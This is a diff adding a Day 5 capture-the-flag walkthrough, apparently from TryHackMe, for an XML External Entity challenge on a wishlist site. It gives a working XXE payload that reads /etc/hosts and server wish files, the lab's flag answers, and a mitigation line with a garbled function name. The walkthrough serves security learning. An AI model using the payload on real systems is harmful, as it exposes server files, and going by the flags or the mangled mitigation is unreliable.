@@ -107,3 +107,51 @@ Answer: THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}. Running `Invoke-AtomicTest T1059.
 - MITRE ATT&CK which is a popular framework for understanding the different techniques and tactics that threat actors perform.
 
 # Day 5
+
+**Challenge:**
+- The website given in the challenge allows users to request Christmas wishes by clicking on an item and adding it to the wish list.
+- While checking out, after filling in address, the item is shown to be saved as Wish #. This feature can be exploited.
+- To intercept this request, a browser can be opened in Burp Suite, and the request made while adding to wish list can be sent to Intruder. 
+- Now, the XML in `/wishlist.php` which is
+```xml
+<wishlist> 
+  <user_id> 
+    1 
+  </user_id> 
+  <item> 
+    <product_id> 
+      1 
+    </product_id>
+  </item> 
+</wishlist
+```
+can be changed to have an XXE payload which is
+```xml
+<!--?xml version="1.0" ?--> 
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]> 
+<wishlist> 
+  <user_id>
+    1
+  </user_id> 
+  <item> 
+    <product_id>
+      &payload;
+    </product_id> 
+  </item> 
+</wishlist>
+```
+This leaks the contents of the `/etc/hosts` file. This way contents of wish_[].txt files can be leaked with `[<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]`
+
+**Questions:**
+1. *What is the flag discovered after navigating through the wishes?*
+
+Answer: THM{Brut3f0rc1n6_mY_w4y}. It is seen in Wish #15
+
+2. *What is the flag seen on the possible proof of sabotage?*
+
+Answer: THM{m4y0r_m4lw4r3_b4ckd00rs}. It's mentioned that the `/CHANGELOG` file can be accessed, which is where the flag is found.
+
+**Concepts:**
+- XML External Entity Injection
+- Approaches to limit such attacks such as including `ibxml_disable_entity_loader(true)` and removing `/etc/host` or `/etc/passwd` from requests
+
